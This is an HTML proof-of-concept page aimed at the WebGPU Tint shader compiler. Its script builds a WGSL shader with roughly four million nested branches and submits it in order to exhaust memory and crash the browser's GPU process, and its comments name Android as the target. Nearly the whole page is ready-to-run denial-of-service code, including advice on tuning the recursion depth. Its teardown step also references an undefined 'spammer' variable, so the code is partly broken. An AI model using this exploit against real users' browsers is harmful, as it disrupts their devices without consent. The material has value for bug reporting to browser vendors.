<!DOCTYPE html>
<html>
<head>
    <title>WebGPU Tint AST Exhaustion PoC</title>
    <style>body { font-family: monospace; background: #222; color: #0f0; font-size: 18px; }</style>
</head>
<body>
    <h2>Tint AST Memory Exhaustion (SIGTRAP)</h2>
    <p>Clicking the button builds a 4-million branch WGSL shader to OOM the GPU process.</p>
    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">CRASH GPU</button>
    <div id="status" style="margin-top: 20px;">Waiting...</div>

    <script>
        const statusEl = document.getElementById('status');

        // Exponentially branching AST generator
        function generateMassiveAST(depth) {
            if (depth <= 0) return `return vec4<f32>(1.0);`;
            const branch = generateMassiveAST(depth - 1);
            return `if (true) { ${branch} } else { ${branch} }`;
        }

        async function triggerCrash() {
            if (!navigator.gpu) {
                statusEl.innerText = "WebGPU is not supported.";
                return;
            }

            const adapter = await navigator.gpu.requestAdapter();
            const device = await adapter.requestDevice();

            statusEl.innerText = "Building massive WGSL string in JavaScript (Please wait)...";
            
            // Depth 22 = ~4.1 million branches. 
            // Avoids JS RangeError, but guarantees C++ Tint AST OOM.
            setTimeout(() => {
                try {
                    const body = generateMassiveAST(22);
                    const killerWGSL = `@vertex fn vs_main() -> @builtin(position) vec4<f32> {\n${body}\n}`;
                    
                    statusEl.innerText = "String built! Sending to Tint Compiler. Brace for Aw, Snap...";
                    
                    // This instantly crashes the Android GPU Process (SIGTRAP)
                    device.createShaderModule({ code: killerWGSL });
                    
                } catch (e) {
                    statusEl.innerText = "JS Error (Try lowering depth to 21 if RangeError occurs): " + e.message;
                }
            }, 100);

            setTimeout(() => {
                clearInterval(spammer);
                statusEl.innerText = "Triggering Teardown...";
                window.location.reload(); 
            }, 5000);
        }

        document.getElementById('crashBtn').addEventListener('click', triggerCrash);
    </script>
</body>
</html>
